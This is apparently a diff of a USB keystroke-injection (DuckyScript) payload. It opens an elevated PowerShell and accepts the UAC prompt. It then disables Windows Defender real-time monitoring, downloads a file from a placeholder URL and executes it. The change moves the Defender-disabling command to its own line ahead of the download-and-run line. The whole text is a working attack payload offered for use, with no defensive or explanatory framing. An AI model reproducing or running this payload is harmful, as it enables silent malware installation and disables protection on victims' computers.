@@ -10,8 +10,11 @@ STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 1000
 ALT y
-DELAY 1000
-STRING $down = New-Object System.Net.WebClient; $url = 'URL_GOES_HERE'; $file = 'FILE_NAME_OUTPUT'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; Set-MpPreference -DisableRealtimeMonitoring $true; $exec.shellexecute($file); exit;
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 200
+STRING $down = New-Object System.Net.WebClient; $url = 'URL_GOES_HERE'; $file = 'FILE_NAME_OUTPUT'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 ENTER
 ```
 
